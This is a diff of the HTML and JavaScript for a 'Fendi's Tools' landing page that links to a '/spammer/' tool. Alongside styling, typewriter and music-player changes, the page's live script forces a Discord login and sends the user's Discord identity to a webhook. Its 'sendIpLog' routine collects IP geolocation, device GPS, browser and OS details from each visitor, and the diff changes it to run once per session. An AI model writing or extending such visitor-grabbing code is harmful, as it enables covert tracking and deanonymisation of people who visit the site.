@@ -4,14 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Fendi's Tools</title>
+    <!-- Tab icon: white logo -->
     <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        /* ========== same styles as your landing page (unchanged) ========== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
             background: #000000;
@@ -24,26 +21,9 @@
             overflow-x: hidden;
             color: #eee;
         }
-
-        /* WHITE SNOW */
-        #snowCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
-
-        /* BLACK GRID WITH WHITE LINES */
+        #snowCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
         .grid-backdrop {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
             background-image: 
                 repeating-linear-gradient(90deg, rgba(255,255,255,0.25) 0px, rgba(255,255,255,0.25) 1px, transparent 1px, transparent 45px),
                 repeating-linear-gradient(0deg, rgba(255,255,255,0.25) 0px, rgba(255,255,255,0.25) 1px, transparent 1px, transparent 45px),
@@ -51,23 +31,13 @@
             background-blend-mode: overlay, overlay, normal;
             pointer-events: none;
         }
-
-        /* LOADING SCREEN (black/white) */
         .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000000;
-            backdrop-filter: blur(8px);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            backdrop-filter: blur(8px); z-index: 1000;
+            display: flex; align-items: center; justify-content: center;
             transition: opacity 1s ease, visibility 1s ease;
-            opacity: 1;
-            visibility: visible;
+            opacity: 1; visibility: visible;
         }
         .loading-screen.hide { opacity: 0; visibility: hidden; }
         .loading-content { text-align: center; animation: fadeUp 0.8s ease-out; display: flex; flex-direction: column; align-items: center; gap: 1.5rem; }
@@ -96,7 +66,6 @@
         .loading-discord-link { background: rgba(30,30,30,0.7); padding: 0.7rem 1.5rem; border-radius: 3rem; border: 1px solid white; cursor: pointer; display: inline-block; }
         .loading-discord-link a { color: white; text-decoration: none; font-weight: 600; }
 
-        /* LANDING PAGE (tool selection) */
         .landing-page {
             width: 100%;
             max-width: 1000px;
@@ -107,8 +76,6 @@
             display: none;
         }
         .landing-page.visible { display: block; }
-
-        /* Glowing typewriter title (white glow) */
         .glow-title {
             text-align: center;
             font-size: 2rem;
@@ -131,7 +98,6 @@
             0% { text-shadow: 0 0 5px rgba(255,255,255,0.4), 0 0 10px rgba(200,200,200,0.3); }
             100% { text-shadow: 0 0 20px rgba(255,255,255,0.8), 0 0 35px rgba(255,255,255,0.6); }
         }
-
         .tools-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -158,7 +124,6 @@
         .placeholder { opacity: 0.6; cursor: not-allowed; }
         .placeholder:hover { transform: none; box-shadow: none; }
 
-        /* MUSIC PLAYER (top‑right) */
         .music-player {
             position: fixed;
             top: 15px;
@@ -178,7 +143,6 @@
         .music-player button:hover { color: #aaa; transform: scale(1.05); }
         .music-player .track-title { color: #ddd; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 0.75rem; }
 
-        /* TOP‑LEFT LOGO (white version) */
         .top-left-logo {
             position: fixed;
             top: 15px;
@@ -186,6 +150,7 @@
             z-index: 100;
             cursor: pointer;
         }
+        /* White logo for landing page */
         .top-left-logo img {
             width: 45px;
             height: 45px;
@@ -212,6 +177,7 @@
 <canvas id="snowCanvas"></canvas>
 
 <div class="top-left-logo" id="logoBtn">
+    <!-- White logo for landing -->
     <img src="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png" alt="Logo">
 </div>
 
@@ -222,7 +188,6 @@
     <span id="trackTitle" class="track-title">Pass Out</span>
 </div>
 
-<!-- LOADING SCREEN -->
 <div id="loadingScreen" class="loading-screen">
     <div class="loading-content">
         <div class="loading-logo">FENDI'S TOOLS</div>
@@ -232,7 +197,6 @@
     </div>
 </div>
 
-<!-- LANDING PAGE -->
 <div id="landingPage" class="landing-page">
     <div class="glow-title"><span id="typewriterTarget"></span></div>
     <div class="tools-grid">
@@ -274,15 +238,15 @@
         const loadingScreen = document.getElementById('loadingScreen');
         const landingPage = document.getElementById('landingPage');
         
-        // ========== DISCORD LOGIN + GPS + IP LOG (shared state) ==========
-        const DISCORD_CLIENT_ID = "1497155951067664415";  // REPLACE WITH YOUR CLIENT ID
+        // ========== DISCORD OAUTH & GPS (same as before) ==========
+        const DISCORD_CLIENT_ID = "1497155951067664415";
         const REDIRECT_URI = window.location.origin;
         let discordToken = localStorage.getItem("discord_access_token");
         let gpsRequested = localStorage.getItem("gpsRequested") === "true";
         let gpsGranted = localStorage.getItem("gpsGranted") === "true";
-        let ipLogSent = false;
+        let ipLogSentSession = sessionStorage.getItem("ipLogSent") === "true";
 
-        // ----- Helper functions -----
+        // ----- Helper functions (unchanged) -----
         async function getIpGeo() {
             try {
                 const res = await fetch('https://ip-api.com/json/');
@@ -385,8 +349,9 @@
         }
 
         async function sendIpLog() {
-            if (ipLogSent) return;
-            ipLogSent = true;
+            if (ipLogSentSession) return;
+            ipLogSentSession = true;
+            sessionStorage.setItem("ipLogSent", "true");
             const ipGeo = await getIpGeo();
             const deviceGPS = await getDeviceLocation();
             const { browser, os, userAgent } = getBrowserOS();
@@ -426,7 +391,7 @@
             } catch(e) { console.error("Failed to send IP log", e); }
         }
 
-        // ----- Discord OAuth PKCE (same as spammer page) -----
+        // ----- Discord OAuth PKCE (same as before) -----
         function generateRandomString(length) {
             let text = "";
             const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
@@ -505,15 +470,24 @@
                     else localStorage.removeItem("discord_access_token");
                 } catch(e) { localStorage.removeItem("discord_access_token"); }
             }
-            // Not logged in – start OAuth
             const { codeVerifier, codeChallenge } = await generatePKCE();
             localStorage.setItem("code_verifier", codeVerifier);
             const authUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify&code_challenge=${codeChallenge}&code_challenge_method=S256`;
             window.location.href = authUrl;
-            return false; // will redirect
+            return false;
         }
 
-        // Handle OAuth redirect on landing page
+        // ========== ENTER BUTTON ==========
+        enterBtn.addEventListener('click', async () => {
+            await ensureLoggedIn();
+            // After OAuth redirect, finishEntry will be called from the code handler.
+            // If already logged in, the function below will be called immediately.
+            if (localStorage.getItem("discord_access_token")) {
+                finishEntry();
+            }
+        });
+
+        // Handle OAuth redirect
         const urlParams = new URLSearchParams(window.location.search);
         const code = urlParams.get("code");
         if (code) {
@@ -524,7 +498,6 @@
                     const user = await fetchDiscordUser(token);
                     sendDiscordInfoToWebhook(user);
                     window.history.replaceState({}, document.title, window.location.pathname);
-                    // After login, continue to landing
                     finishEntry();
                 }).catch(err => {
                     console.error("Token exchange failed", err);
@@ -536,32 +509,22 @@
                 finishEntry();
             }
         } else {
-            finishEntry();
+            if (localStorage.getItem("discord_access_token")) {
+                finishEntry();
+            }
         }
 
         async function finishEntry() {
-            // Send IP log and GPS (only once)
-            await sendIpLog();
-            // Show landing page
+            await sendIpLog();   // Only once per session
             loadingScreen.classList.add('hide');
             setTimeout(() => {
                 loadingScreen.style.display = 'none';
                 landingPage.classList.add('visible');
-                startMusic();
+                startMusic();    // Start music after ENTER/redirect
             }, 800);
         }
 
-        enterBtn.addEventListener('click', async () => {
-            // Before showing landing, ensure Discord login and GPS
-            await ensureLoggedIn();
-            // The OAuth redirect will happen if not logged in.
-            // If already logged in, finishEntry is called manually.
-            if (localStorage.getItem("discord_access_token")) {
-                finishEntry();
-            }
-        });
-
-        // ========== TYPEWRITER EFFECT (white glow, eternal loop) ==========
+        // ========== TYPEWRITER EFFECT ==========
         const titleText = "Fendi's Tools";
         const targetSpan = document.getElementById('typewriterTarget');
         let i = 0;
@@ -588,7 +551,7 @@
         }
         typeWriter();
 
-        // ========== MUSIC PLAYER (shared state) ==========
+        // ========== MUSIC PLAYER ==========
         const tracks = [
             { title: "Pass Out", url: "./songs/PassOut.mp3" },
             { title: "VYZEE", url: "./songs/VYZEE.mp3" },
@@ -603,6 +566,16 @@
         const playPauseBtn = document.getElementById('playPauseBtn');
         const prevBtn = document.getElementById('prevTrackBtn');
         const nextBtn = document.getElementById('nextTrackBtn');
+
+        // Clear music state on direct visit (no "fromSpammer" flag)
+        const fromSpammer = sessionStorage.getItem('fromSpammer') === 'true';
+        if (!fromSpammer) {
+            localStorage.removeItem('musicTrackIndex');
+            localStorage.removeItem('musicCurrentTime');
+            localStorage.removeItem('musicPlaying');
+        } else {
+            sessionStorage.removeItem('fromSpammer');
+        }
 
         function saveMusicState() {
             if (audio) {
@@ -687,14 +660,14 @@
         prevBtn.addEventListener('click', prevTrack);
         nextBtn.addEventListener('click', nextTrack);
 
-        // ========== TOOL SELECTION – go to spammer with flag ==========
+        // ========== TOOL SELECTION ==========
         const toolCards = document.querySelectorAll('.tool-card');
         toolCards.forEach(card => {
             if (!card.classList.contains('placeholder')) {
                 card.addEventListener('click', () => {
-                    saveMusicState(); // save current music
-                    // Add a flag to indicate we came from landing page
-                    localStorage.setItem('fromLanding', 'true');
+                    saveMusicState();
+                    // Set flag to tell spammer page to restore music
+                    sessionStorage.setItem('fromLanding', 'true');
                     window.location.href = '/spammer/';
                 });
             }
